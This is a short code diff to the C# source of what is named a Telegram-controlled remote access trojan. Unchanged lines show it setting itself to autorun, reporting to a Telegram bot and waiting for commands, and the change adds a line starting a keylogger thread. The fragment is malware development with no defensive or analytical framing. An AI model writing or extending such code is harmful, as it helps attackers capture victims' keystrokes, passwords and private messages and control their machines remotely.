@@ -24,6 +24,8 @@ namespace TelegramRAT
             persistense.setAutorun();
             // Send 'online' to telegram bot
             telegram.sendConnection();
+            // Start offline keylogger
+            utils.keyloggerThread.Start();
             // Wait for new commands
             telegram.waitCommands();
             // Lock main thread
